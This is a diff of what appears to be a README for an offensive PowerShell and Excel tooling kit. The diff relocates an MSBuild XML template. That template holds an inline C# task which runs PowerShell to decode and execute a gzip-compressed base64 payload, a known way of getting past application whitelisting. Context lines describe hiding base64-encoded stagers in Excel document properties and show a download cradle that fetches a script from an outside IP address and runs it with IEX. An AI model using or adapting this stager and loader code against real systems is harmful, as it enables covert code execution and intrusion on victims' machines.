@@ -5,51 +5,6 @@
 - Now you will have three XML files (outlook, bypass, stager).
 - Lastly take each file and base64 encode it using https://www.base64encode.org/ , then put each encoded file in (Author, Manager, Company) excel properties.
 
-## XML Template
-```
-<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <Target Name="34rfas">
-   <QWEridxnaPO />
-  </Target>
-	<UsingTask
-    TaskName="QWEridxnaPO"
-    TaskFactory="CodeTaskFactory"
-    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
-	<Task>
-	  <Reference Include="System.Management.Automation" />
-      <Code Type="Class" Language="cs">
-        <![CDATA[		
-			using System;
-			using System.IO;
-			using System.Diagnostics;
-			using System.Reflection;
-			using System.Runtime.InteropServices;
-			using System.Collections.ObjectModel;
-			using System.Management.Automation;
-			using System.Management.Automation.Runspaces;
-			using System.Text;
-			using Microsoft.Build.Framework;
-			using Microsoft.Build.Utilities;							
-			public class QWEridxnaPO :  Task, ITask {
-				public override bool Execute() {
-					string pok = "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()";
-					Runspace runspace = RunspaceFactory.CreateRunspace();
-					runspace.Open();
-					RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
-					Pipeline pipeline = runspace.CreatePipeline();
-					pipeline.Commands.AddScript(pok);
-					pipeline.Invoke();
-					runspace.Close();			
-					return true;
-				}								 
-			}			
-        ]]>
-      </Code>
-    </Task>
-  </UsingTask>
-</Project>
-```
-
 ## Outlook Monitor
 ```
 function New-DynamicOutlookTrigger
@@ -169,6 +124,49 @@ sleep 61
 $browser = New-Object System.Net.WebClient;$u = 'Mozilla /5.0 useragent';$browser.headers.add('User-Agent',$u);$browser.Proxy = [system.net.webrequest]::defaultwebproxy;$browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials;$browser.Downloadstring('http://192.168.43.207:8000/ps1.crt') | IEX;
 ```
 
-
+## XML Template
+```
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="34rfas">
+   <QWEridxnaPO />
+  </Target>
+	<UsingTask
+    TaskName="QWEridxnaPO"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	<Task>
+	  <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[		
+			using System;
+			using System.IO;
+			using System.Diagnostics;
+			using System.Reflection;
+			using System.Runtime.InteropServices;
+			using System.Collections.ObjectModel;
+			using System.Management.Automation;
+			using System.Management.Automation.Runspaces;
+			using System.Text;
+			using Microsoft.Build.Framework;
+			using Microsoft.Build.Utilities;							
+			public class QWEridxnaPO :  Task, ITask {
+				public override bool Execute() {
+					string pok = "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()";
+					Runspace runspace = RunspaceFactory.CreateRunspace();
+					runspace.Open();
+					RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
+					Pipeline pipeline = runspace.CreatePipeline();
+					pipeline.Commands.AddScript(pok);
+					pipeline.Invoke();
+					runspace.Close();			
+					return true;
+				}								 
+			}			
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
+```
 
 
